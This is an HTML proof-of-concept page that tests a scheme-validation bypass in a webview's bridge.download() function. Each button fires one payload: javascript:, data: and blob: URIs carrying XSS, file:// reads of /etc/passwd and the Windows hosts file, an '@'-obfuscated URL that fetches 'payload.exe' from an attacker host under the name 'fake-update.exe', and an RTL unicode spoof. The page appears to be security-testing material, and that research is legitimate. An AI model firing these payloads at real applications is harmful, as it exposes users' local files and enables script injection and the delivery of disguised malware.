<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>bridge.download() Schema Bypass PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
    button { margin: 5px 0; padding: 6px 12px; font-size: 14px; cursor: pointer; }
    .log { white-space: pre-wrap; margin-top: 20px; background: #222; padding: 10px; border-radius: 6px; }
  </style>
</head>
<body>
  <h2>bridge.download() Bypass & Exploit Tester</h2>

  <div id="buttons"></div>

  <div class="log" id="log">[LOG OUTPUT]</div>

  <script>
    const log = (msg) => {
      console.log(msg);
      document.getElementById('log').textContent += "\n" + msg;
    };

    const payloads = [
      {
        name: "üî¥ javascript: URI",
        url: "javascript:alert('XSS via javascript:')"
      },
      {
        name: "üü† Encoded javascript:",
        url: decodeURIComponent("javascript%3Aalert('Encoded XSS')")
      },
      {
        name: "üü° data: URI",
        url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+"
      },
      {
        name: "üîµ blob: HTML",
        dynamic: true,
        content: `<html><body><script>alert('Blob XSS')</scrip</body></html>`,
        type: "text/html",
        filename: "blob-xss.html"
      },
      {
        name: "üü§ file:///etc/passwd (Linux)",
        url: "file:///etc/passwd",
        filename: "passwd.txt"
      },
      {
        name: "üü£ file:///Windows/hosts (Windows)",
        url: "file:///C:/Windows/System32/drivers/etc/hosts",
        filename: "hosts.txt"
      },
      {
        name: "‚ö´ Obfuscated https with @",
        url: "https://evil.com@attacker.ru/payload.exe",
        filename: "fake-update.exe"
      },
      {
        name: "‚ö™ Unicode spoof (RTL)",
        url: "https://\u202Evbscript.com",
        filename: "spoof.txt"
      }
    ];

    const container = document.getElementById("buttons");

    payloads.forEach((payload, idx) => {
      const btn = document.createElement("button");
      btn.textContent = `${idx + 1}. ${payload.name}`;
      btn.onclick = () => {
        try {
          if (payload.dynamic) {
            const blob = new Blob([payload.content], { type: payload.type });
            const url = URL.createObjectURL(blob);
            window.bridge.download({ url, name: payload.filename });
            log(`‚úî Triggered: ${payload.name} (blob: ${url})`);
          } else {
            window.bridge.download({ url: payload.url, name: payload.filename || "test.txt" });
            log(`‚úî Triggered: ${payload.name} ‚Üí ${payload.url}`);
          }
        } catch (err) {
          log(`‚ùå Blocked: ${payload.name} ‚Üí ${err}`);
        }
      };
      container.appendChild(btn);
    });
  </script>
</body>
</html>
